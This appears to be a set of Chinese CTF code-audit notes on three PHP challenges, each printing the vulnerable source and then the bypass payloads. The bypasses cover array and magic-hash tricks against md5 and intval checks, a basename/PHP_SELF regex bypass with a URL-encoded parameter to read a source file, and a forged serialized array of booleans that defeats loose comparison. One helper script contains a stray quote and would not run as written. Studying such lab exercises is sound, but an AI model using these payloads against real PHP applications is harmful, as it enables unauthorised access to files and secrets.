#php #弱比较 #数组绕过 代码审计

<?php  
highlight_file(__FILE__);  
include_once('flag.php');  
if(isset($_POST['a'])&&!preg_match('/[0-9]/',$_POST['a'])&&intval($_POST['a'])){  
    if(isset($_POST['b1'])&&$_POST['b2']){  
        if($_POST['b1']!=$_POST['b2']&&md5($_POST['b1'])===md5($_POST['b2'])){  
            if($_POST['c1']!=$_POST['c2']&&is_string($_POST['c1'])&&is_string($_POST['c2'])&&md5($_POST['c1'])==md5($_POST['c2'])){  
                echo $flag;  
            }else{  
                echo "yee";  
            }  
        }else{  
            echo "nop";  
        }  
    }else{  
        echo "go on";  
    }  
}else{  
    echo "let's get some php";  
}  
?>

三层绕过 第一层是intval绕过，利用数组绕 a[]=1 第二层数值不相等但是md5强比较相等，由于md5和sha1对一个数组进行加密将返回NULL，而NULL === NULL返回true，所以可绕过判断. b1[]=1&b2[]=1 最后一层俩字符串md5弱比较，弱比较会截取字符串，所以0exxx和0eyyy是相等的 c1=240610708&c2=QNKCDZO

#php #正则绕过 #文件包含 代码审计

<?php  
include 'utils.php';  
  
if (isset($_POST['guess'])) {    
$guess = (string) $_POST['guess'];  
    if ($guess === $secret) {        
    $message = 'Congratulations! The flag is: ' . $flag;  
    } else {        $message = 'Wrong. Try Again';  
    }  
}  
  
if (preg_match('/utils\.php\/*$/i', $_SERVER['PHP_SELF'])) {  
    exit("hacker :)");  
}  
  
if (preg_match('/show_source/', $_SERVER['REQUEST_URI'])){  
    exit("hacker :)");  
}  
  
if (isset($_GET['show_source'])) {    
highlight_file(basename($_SERVER['PHP_SELF']));  
    exit();  
}else{    
show_source(__FILE__);  
}  
?>

首先是basename($_SERVER['PHP_SELF']) $_SERVER['PHP_SELF']得到的是目前所在的目录，默认就是index.php 而basename会返回路径中的文件名，且会去除非ascii码字符。 需要绕过preg_match('/utils\.php\/*$/i' 这个正则表达式匹配的是utils.php/的结尾，所以就算是/utils.php/a也能绕过，而根据basename的特性，把a换成中文就可以了。

之后是preg_match('/show_source/'，由于$_SERVER['REQUEST_URI']是不解码的，所以把show_sourceurl编码即可。为了保证url中包含utils也要能传参，还要在前面加上index.php。 最后exp：

/index.php/utils.php/你?%73%68%6f%77%5f%73%6f%75%72%63%65=1

#php #弱比较 #反序列化 代码审计

<?php  
show_source(__FILE__);  
$username  = "this_is_secret"; 
$password  = "this_is_not_known_to_you";   
include("flag.php");//here I changed those two
$info = isset($_GET['info'])? $_GET['info']: "" ;  
$data_unserialize = unserialize($info);  
if ($data_unserialize['username']==$username&&$data_unserialize['password']==$password){  
    echo $flag;  
}else{  
    echo "username or password error!";  
  
}  
  
?>

反序列化出来username和password，要求弱比较和定义里的一样，但是注释说已经改变数值了。 True和什么弱比较都为真，所以exp：

<?php 
$ab=array( 'username'=>true, 'password'=>true" ); 
$b=serialize($ab); 
echo $b;
?>
?info=a:2:{s:8:"username";b:1;s:8:"password";b:1;}
